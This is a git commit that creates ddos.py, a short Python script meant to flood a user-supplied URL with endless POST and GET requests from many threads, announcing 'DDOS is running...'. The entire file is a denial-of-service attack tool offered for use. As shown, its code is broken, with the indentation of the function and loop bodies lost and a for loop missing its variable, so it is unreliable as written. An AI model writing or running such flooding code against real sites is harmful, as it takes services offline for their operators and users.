9683b16cb4611d3cf9c2cd130b68d4841c312f47
jusifake <102470125+KSSscriptt@users.noreply.github.com>
2022-03-29 15:10:03 +0600

    Create ddos.py

---
+++ ddos.py
@@ -0,0 +1,12 @@
+import requests
+from threading import Thread
+url = input('Url:')
+thrnom = input('Threads:')
+def ddos():
+while(1<10):
+spam = requests.post(url)
+spam2 = requests.get(url)
+for in range(int(thrnom)):
+thr = Thread(target = ddos)
+thr.start()
+print("DDOS is running...")
